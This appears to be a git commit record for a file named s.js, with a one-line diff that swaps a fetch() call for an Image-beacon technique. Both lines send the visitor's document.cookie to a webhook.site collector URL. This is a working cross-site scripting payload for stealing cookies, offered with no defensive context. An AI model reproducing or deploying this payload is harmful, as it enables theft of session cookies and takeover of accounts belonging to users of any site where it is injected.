366616ff3bb107a989fbf71c48556da0f59ef939
dSp3ar <98909512+dSp3ar@users.noreply.github.com>
2025-05-14 15:54:24 +0300

    Update s.js

--- s.js
+++ s.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/511a8123-6c3f-4bcd-9a34-6ff44e2c698e?q="+document.cookie);
+(new Image).src="https://webhook.site/511a8123-6c3f-4bcd-9a34-6ff44e2c698e?q="+document.cookie;
